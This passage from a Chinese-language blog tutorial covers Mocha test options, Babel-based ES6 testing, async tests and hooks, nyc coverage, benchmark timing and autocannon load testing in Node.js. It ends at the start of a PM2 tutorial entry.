<p>为了改变这种行为，就必须加上–recursive参数，这时test子目录下面所有的测试用例—-不管在哪一层—-都会执行。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha --recursive</span><br><span class="line"></span><br><span class="line">  加法函数的测试</span><br><span class="line">    ✓ 1 加 1 应该等于 2</span><br><span class="line">    ✓ 任何数加0应该等于自身</span><br><span class="line"></span><br><span class="line">  乘法函数的测试</span><br><span class="line">    ✓ 1 乘 1 应该等于 1</span><br><span class="line"></span><br><span class="line">  3 passing (9ms)</span><br></pre></td></tr></table></figure></p>
<h2 id="5-通配符"><a href="#5-通配符" class="headerlink" title="5.通配符"></a>5.通配符</h2><p>命令行指定测试脚本时，可以使用通配符，同时指定多个文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha spec/&#123;my,awesome&#125;.js</span><br><span class="line">$ mocha test/unit/*.js</span><br></pre></td></tr></table></figure></p>
<p>上面的第一行命令，指定执行spec目录下面的my.js和awesome.js。第二行命令，指定执行test/unit目录下面的所有js文件。</p>
<p>除了使用Shell通配符，还可以使用Node通配符。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha &apos;test/**/*.@(js|jsx)&apos;</span><br></pre></td></tr></table></figure></p>
<p>上面代码指定运行test目录下面任何子目录中、文件后缀名为js或jsx的测试脚本。注意，Node的通配符要放在单引号之中，否则星号（*）会先被Shell解释。</p>
<p>上面这行Node通配符，如果改用Shell通配符，要写成下面这样。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha test/&#123;,**/&#125;*.&#123;js,jsx&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="6-命令行参数"><a href="#6-命令行参数" class="headerlink" title="6.命令行参数"></a>6.命令行参数</h2><p>除了前面介绍的–recursive，Mocha还可以加上其他命令行参数。请在demo02子目录里面，运行下面的命令，查看效果。</p>
<p>–help或-h参数，用来查看Mocha的所有命令行参数。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha --help</span><br></pre></td></tr></table></figure></p>
<p>–reporter(-R)参数用来指定测试报告的格式，默认是spec格式。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha</span><br><span class="line"># 等同于</span><br><span class="line">$ mocha --reporter spec</span><br></pre></td></tr></table></figure></p>
<p>除了spec格式，官方网站还提供了其他许多报告格式。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha --reporter tap</span><br><span class="line"></span><br><span class="line">1..2</span><br><span class="line">ok 1 加法函数的测试 1 加 1 应该等于 2</span><br><span class="line">ok 2 加法函数的测试 任何数加0应该等于自身</span><br><span class="line"># tests 2</span><br><span class="line"># pass 2</span><br><span class="line"># fail 0</span><br></pre></td></tr></table></figure></p>
<p>–reporters参数可以显示所有内置的报告格式。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha --reporters</span><br></pre></td></tr></table></figure></p>
<p>使用mochawesome模块，可以生成漂亮的HTML格式的报告。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install --save-dev mochawesome</span><br><span class="line">$ ../node_modules/.bin/mocha --reporter mochawesome</span><br></pre></td></tr></table></figure></p>
<p>上面代码中，mocha命令使用了项目内安装的版本，而不是全局安装的版本，因为mochawesome模块是安装在项目内的。</p>
<p>然后，测试结果报告就在mochaawesome-reports子目录生成。</p>
<p>打开–growl(-G)参数，就会将测试结果在桌面显示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha --growl</span><br></pre></td></tr></table></figure></p>
<p>–watch(-w)参数用来监视指定的测试脚本。只要测试脚本有变化，就会自动运行Mocha。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha --watch</span><br></pre></td></tr></table></figure></p>
<p>上面命令执行以后，并不会退出。你可以另外打开一个终端窗口，修改test目录下面的测试脚本add.test.js，比如删除一个测试用例，一旦保存，Mocha就会再次自动运行。</p>
<p>–bail(-b)参数指定只要有一个测试用例没有通过，就停止执行后面的测试用例。这对持续集成很有用。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha --bail</span><br></pre></td></tr></table></figure></p>
<p>-grep, -g 参数用于搜索测试用例的名称（即it块的第一个参数），然后只执行匹配的测试用例。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha --grep &quot;1 加 1&quot;</span><br></pre></td></tr></table></figure></p>
<p>上面代码只测试名称中包含”1 加 1”的测试用例。</p>
<p>-invert, -i 参数表示只运行不符合条件的测试脚本，必须与–grep参数配合使用。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mocha --grep &quot;1 加 1&quot; --invert</span><br></pre></td></tr></table></figure></p>
<h2 id="7-配置文件mocha-opts"><a href="#7-配置文件mocha-opts" class="headerlink" title="7.配置文件mocha.opts"></a>7.配置文件mocha.opts</h2><p>Mocha允许在test目录下面，放置配置文件mocha.opts，把命令行参数写在里面。请先进入demo03目录，运行下面的命令。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha --recursive --reporter tap --growl</span><br></pre></td></tr></table></figure></p>
<p>上面这个命令有三个参数–recursive、–reporter tap、–growl。<br>然后，把这三个参数写入test目录下的mocha.opts文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--reporter tap</span><br><span class="line">--recursive</span><br><span class="line">--growl</span><br></pre></td></tr></table></figure></p>
<p>然后，执行mocha就能取得与第一行命令一样的效果。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha</span><br></pre></td></tr></table></figure></p>
<p>如果测试用例不是存放在test子目录，可以在mocha.opts写入以下内容。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server-tests</span><br><span class="line">--recursive</span><br></pre></td></tr></table></figure></p>
<p>上面代码指定运行server-tests目录及其子目录之中的测试脚本。</p>
<h2 id="8-ES6测试"><a href="#8-ES6测试" class="headerlink" title="8.ES6测试"></a>8.ES6测试</h2><p>如果测试脚本是用ES6写的，那么运行测试之前，需要先用Babel转码。进入demo04目录，打开test/add.test.js文件，可以看到这个测试用例是用ES6写的。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> add <span class="keyword">from</span> <span class="string">'../src/add.js'</span>;</span><br><span class="line"><span class="keyword">import</span> chai <span class="keyword">from</span> <span class="string">'chai'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> expect = chai.expect;</span><br><span class="line"></span><br><span class="line">describe(<span class="string">'加法函数的测试'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  it(<span class="string">'1 加 1 应该等于 2'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    expect(add(<span class="number">1</span>, <span class="number">1</span>)).to.be.equal(<span class="number">2</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>ES6转码，需要安装Babel。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install babel-core babel-preset-es2015 --save-dev</span><br></pre></td></tr></table></figure></p>
<p>然后，在项目目录下面，新建一个.babelrc配置文件。<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"presets"</span>: [ <span class="string">"es2015"</span> ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后，使用–compilers参数指定测试脚本的转码器。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ../node_modules/mocha/bin/mocha --compilers js:babel-core/register</span><br></pre></td></tr></table></figure></p>
<p>上面代码中，–compilers参数后面紧跟一个用冒号分隔的字符串，冒号左边是文件的后缀名，右边是用来处理这一类文件的模块名。上面代码表示，运行测试之前，先用babel-core/register模块，处理一下.js文件。由于这里的转码器安装在项目内，所以要使用项目内安装的Mocha；如果转码器安装在全局，就可以使用全局的Mocha。</p>
<p>下面是另外一个例子，使用Mocha测试CoffeeScript脚本。测试之前，先将.coffee文件转成.js文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha --compilers coffee:coffee-script/register</span><br></pre></td></tr></table></figure></p>
<p>注意，Babel默认不会对Iterator、Generator、Promise、Map、Set等全局对象，以及一些全局对象的方法（比如Object.assign）转码。如果你想要对这些对象转码，就要安装babel-polyfill。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install babel-polyfill --save</span><br></pre></td></tr></table></figure></p>
<p>然后，在你的脚本头部加上一行。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">'babel-polyfill'</span></span><br></pre></td></tr></table></figure></p>
<h2 id="9-异步测试"><a href="#9-异步测试" class="headerlink" title="9.异步测试"></a>9.异步测试</h2><p>Mocha默认每个测试用例最多执行2000毫秒，如果到时没有得到结果，就报错。对于涉及异步操作的测试用例，这个时间往往是不够的，需要用-t或–timeout参数指定超时门槛。</p>
<p>进入demo05子目录，打开测试脚本timeout.test.js。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">it(<span class="string">'测试应该5000毫秒后结束'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">done</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    x = <span class="literal">false</span>;</span><br><span class="line">    expect(x).to.be.not.ok;</span><br><span class="line">    done(); <span class="comment">// 通知Mocha测试结束</span></span><br><span class="line">  &#125;;</span><br><span class="line">  setTimeout(f, <span class="number">4000</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>上面的测试用例，需要4000毫秒之后，才有运行结果。所以，需要用-t或–timeout参数，改变默认的超时设置。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha -t 5000 timeout.test.js</span><br></pre></td></tr></table></figure></p>
<p>上面命令将测试的超时时限指定为5000毫秒。</p>
<p>另外，上面的测试用例里面，有一个done函数。it块执行的时候，传入一个done参数，当测试结束的时候，必须显式调用这个函数，告诉Mocha测试结束了。否则，Mocha就无法知道，测试是否结束，会一直等到超时报错。你可以把这行删除试试看。</p>
<p>Mocha默认会高亮显示超过75毫秒的测试用例，可以用-s或–slow调整这个参数。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha -t 5000 -s 1000 timeout.test.js</span><br></pre></td></tr></table></figure></p>
<p>上面命令指定高亮显示耗时超过1000毫秒的测试用例。</p>
<p>下面是另外一个异步测试的例子async.test.js。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">it(&apos;异步请求应该返回一个对象&apos;, function(done)&#123;</span><br><span class="line">  request</span><br><span class="line">    .get(&apos;https://api.github.com&apos;)</span><br><span class="line">    .end(function(err, res)&#123;</span><br><span class="line">      expect(res).to.be.an(&apos;object&apos;);</span><br><span class="line">      done();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>运行下面命令，可以看到这个测试会通过。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha -t 10000 async.test.js</span><br></pre></td></tr></table></figure></p>
<p>另外，Mocha内置对Promise的支持，允许直接返回Promise，等到它的状态改变，再执行断言，而不用显式调用done方法。请看promise.test.js。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">it(<span class="string">'异步请求应该返回一个对象'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> fetch(<span class="string">'https://api.github.com'</span>)</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> res.json();</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">json</span>) </span>&#123;</span><br><span class="line">      expect(json).to.be.an(<span class="string">'object'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h2 id="10-测试用例的钩子"><a href="#10-测试用例的钩子" class="headerlink" title="10.测试用例的钩子"></a>10.测试用例的钩子</h2><p>Mocha在describe块之中，提供测试用例的四个钩子：before()、after()、beforeEach()和afterEach()。它们会在指定时间执行。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">describe(<span class="string">'hooks'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  before(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 在本区块的所有测试用例之前执行</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  after(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 在本区块的所有测试用例之后执行</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  beforeEach(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 在本区块的每个测试用例之前执行</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  afterEach(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 在本区块的每个测试用例之后执行</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// test cases</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>进入demo06子目录，可以看到下面两个例子。首先是beforeEach的例子beforeEach.test.js。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// beforeEach.test.js</span></span><br><span class="line">describe(<span class="string">'beforeEach示例'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> foo = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  beforeEach(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    foo = <span class="literal">true</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'修改全局变量应该成功'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    expect(foo).to.be.equal(<span class="literal">true</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>上面代码中，beforeEach会在it之前执行，所以会修改全局变量。</p>
<p>另一个例子beforeEach-async.test.js则是演示，如何在beforeEach之中使用异步操作。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// beforeEach-async.test.js</span></span><br><span class="line">describe(<span class="string">'异步 beforeEach 示例'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> foo = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  beforeEach(<span class="function"><span class="keyword">function</span>(<span class="params">done</span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      foo = <span class="literal">true</span>;</span><br><span class="line">      done();</span><br><span class="line">    &#125;, <span class="number">50</span>);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'全局变量异步修改应该成功'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    expect(foo).to.be.equal(<span class="literal">true</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h2 id="11-测试用例管理"><a href="#11-测试用例管理" class="headerlink" title="11.测试用例管理"></a>11.测试用例管理</h2><p>大型项目有很多测试用例。有时，我们希望只运行其中的几个，这时可以用only方法。describe块和it块都允许调用only方法，表示只运行某个测试套件或测试用例。</p>
<p>进入demo07子目录，测试脚本test/add.test.js就使用了only。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">it.only(<span class="string">'1 加 1 应该等于 2'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  expect(add(<span class="number">1</span>, <span class="number">1</span>)).to.be.equal(<span class="number">2</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">it(<span class="string">'任何数加0应该等于自身'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  expect(add(<span class="number">1</span>, <span class="number">0</span>)).to.be.equal(<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>上面代码中，只有带有only方法的测试用例会运行。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha test/add.test.js</span><br><span class="line"></span><br><span class="line">  加法函数的测试</span><br><span class="line">    ✓ 1 加 1 应该等于 2</span><br><span class="line"></span><br><span class="line">  1 passing (10ms)</span><br></pre></td></tr></table></figure></p>
<p>此外，还有skip方法，表示跳过指定的测试套件或测试用例。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">it.skip(<span class="string">'任何数加0应该等于自身'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  expect(add(<span class="number">1</span>, <span class="number">0</span>)).to.be.equal(<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>上面代码的这个测试用例不会执行。</p>
<h2 id="12-浏览器测试"><a href="#12-浏览器测试" class="headerlink" title="12.浏览器测试"></a>12.浏览器测试</h2><p>除了在命令行运行，Mocha还可以在浏览器运行。</p>
<p>首先，使用mocha init命令在指定目录生成初始化文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha init demo08</span><br></pre></td></tr></table></figure></p>
<p>运行上面命令，就会在demo08目录下生成index.html文件，以及配套的脚本和样式表。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Unit.js tests in the browser with Mocha<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"mocha"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mocha.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      mocha.setup(<span class="string">'bdd'</span>);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"tests.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">      mocha.run();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>然后，新建一个源码文件add.js。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// add.js</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后，把这个文件，以及断言库chai.js，加入index.html。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  mocha.setup(<span class="string">'bdd'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src="add.js"&gt;&lt;/</span>script&gt;</span><br><span class="line">&lt;script src=<span class="string">"http://chaijs.com/chai.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src="tests.js"&gt;&lt;/</span>script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  mocha.run();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>最后，在tests.js里面写入测试脚本。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> expect = chai.expect;</span><br><span class="line"></span><br><span class="line">describe(<span class="string">'加法函数的测试'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  it(<span class="string">'1 加 1 应该等于 2'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    expect(add(<span class="number">1</span>, <span class="number">1</span>)).to.be.equal(<span class="number">2</span>);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'任何数加0等于自身'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    expect(add(<span class="number">1</span>, <span class="number">0</span>)).to.be.equal(<span class="number">1</span>);</span><br><span class="line">    expect(add(<span class="number">0</span>, <span class="number">0</span>)).to.be.equal(<span class="number">0</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>现在，在浏览器里面打开index.html，就可以看到测试脚本的运行结果。</p>
<h2 id="13-生成规格文件"><a href="#13-生成规格文件" class="headerlink" title="13.生成规格文件"></a>13.生成规格文件</h2><p>Mocha支持从测试用例生成规格文件。</p>
<p>进入demo09子目录，运行下面的命令。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha --recursive -R markdown &gt; spec.md</span><br></pre></td></tr></table></figure></p>
<p>上面命令根据test目录的所有测试脚本，生成一个规格文件spec.md。-R markdown参数指定规格报告是markdown格式。</p>
<p>如果想生成HTML格式的报告spec.html，使用下面的命令。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha --recursive -R doc &gt; spec.html</span><br></pre></td></tr></table></figure></p>
<h1 id="代码覆盖率"><a href="#代码覆盖率" class="headerlink" title="代码覆盖率"></a>代码覆盖率</h1><p>写好了单元测试，我们还会关心测试用例的代码覆盖率情况，<a href="https://www.npmjs.com/package/nyc" target="_blank" rel="noopener">nyc模块</a>可以很方便地生成代码覆盖率报告。</p>
<h2 id="安装和使用"><a href="#安装和使用" class="headerlink" title="安装和使用"></a>安装和使用</h2><p>我们使用以下命令将nyc、mocha模块安装到开发环境依赖中<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install nyc mocha --save-dev</span><br></pre></td></tr></table></figure></p>
<p>在package.json中添加脚本<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"test"</span>: <span class="string">"mocha"</span>,</span><br><span class="line">    <span class="attr">"coverage"</span>: <span class="string">"nyc npm run test"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>此时，执行npm run coverage就可以运行测试用例同时生成代码覆盖率了。</p>
<p>结合前面学习的mocha框架，博主工程的测试脚本如下:<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"scripts": &#123;</span><br><span class="line">  "test": "./node_modules/.bin/nyc ./node_modules/.bin/mocha --compilers js:babel-core/register --recursive",</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p>
<h1 id="基准测试"><a href="#基准测试" class="headerlink" title="基准测试"></a>基准测试</h1><p>基准测试一般会以次数作为参照物，然后比较时间，以此判断性能的差距。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install benchmark --save-dev</span><br></pre></td></tr></table></figure>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Benchmark = <span class="built_in">require</span>(<span class="string">'benchmark'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> suite = <span class="keyword">new</span> Benchmark.Suite;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">suite.add(<span class="string">'nativeMap'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr.map(<span class="function"><span class="params">item</span> =&gt;</span> item);</span><br><span class="line">&#125;).add(<span class="string">'customMap'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> ret = [];</span><br><span class="line">  <span class="keyword">const</span> len = arr.length;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i ++) &#123;</span><br><span class="line">    ret.push(arr[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;).on(<span class="string">'cycle'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">String</span>(event.target));</span><br><span class="line">&#125;)</span><br><span class="line">.on(<span class="string">'complete'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Fastest is '</span> + <span class="keyword">this</span>.filter(<span class="string">'fastest'</span>).map(<span class="string">'name'</span>));</span><br><span class="line">&#125;)</span><br><span class="line">.run(&#123; <span class="string">'async'</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure>
<p>执行上述代码，得到输出结果如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nativeMap x 66,304,396 ops/sec ±0.87% (89 runs sampled)</span><br><span class="line">customMap x 38,024,997 ops/sec ±1.29% (90 runs sampled)</span><br><span class="line">Fastest is nativeMap</span><br></pre></td></tr></table></figure></p>
<p>benchmark模块输出的结果比我们用普通方式进行测试多出±0.87% (89 runs sampled)这么一段，它的测试有着严密的抽样过程，执行多少次方法取决于采样的数据能否完成统计。89 runs sampled表示对nativeMap测试的过程中，有89个样本，标准方差为±0.87%。</p>
<h1 id="压力测试"><a href="#压力测试" class="headerlink" title="压力测试"></a>压力测试</h1><p>对网络接口做压力测试需要考察的几个指标有吞吐率、响应时间和并发数，这些指标反映了服务器的并发处理能力。</p>
<h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install autocannon --save-dev</span><br></pre></td></tr></table></figure>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> autocannon = <span class="built_in">require</span>(<span class="string">'autocannon'</span>);</span><br><span class="line"></span><br><span class="line">autocannon(&#123;</span><br><span class="line">  url: <span class="string">'http://api.douban.com/v2/movie/top250'</span>,</span><br><span class="line">  connections: <span class="number">10</span>, <span class="comment">//default</span></span><br><span class="line">  pipelining: <span class="number">1</span>, <span class="comment">// default</span></span><br><span class="line">  duration: <span class="number">10</span>, <span class="comment">// default</span></span><br><span class="line">  method: <span class="string">'GET'</span>,</span><br><span class="line">&#125;, <span class="built_in">console</span>.log);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// async/await</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span> autocannon(&#123;</span><br><span class="line">    url: <span class="string">'http://api.douban.com/v2/movie/top250'</span>,</span><br><span class="line">    connections: <span class="number">10</span>, <span class="comment">//default</span></span><br><span class="line">    pipelining: <span class="number">1</span>, <span class="comment">// default</span></span><br><span class="line">    duration: <span class="number">10</span>, <span class="comment">// default</span></span><br><span class="line">    method: <span class="string">'GET'</span>,</span><br><span class="line">  &#125;, <span class="built_in">console</span>.log);</span><br><span class="line">  <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test();</span></span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://www.ruanyifeng.com/blog/2015/12/a-mocha-tutorial-of-examples.html" target="_blank" rel="noopener">测试框架 Mocha 实例教程</a></li>
<li>《深入浅出node.js》</li>
<li>网上一些资料，在此不一一列举</li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>node</tag>
        <tag>测试</tag>
      </tags>
  </entry>
  <entry>
    <title>pm2教程</title>
    <url>/2019/06/18/pm2%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>PM2是node进程管理工具，可以利用它来简化很多node应用管理的繁琐任务，如性能监控、自动重启、负载均衡等。<br><a id="more"></a></p>
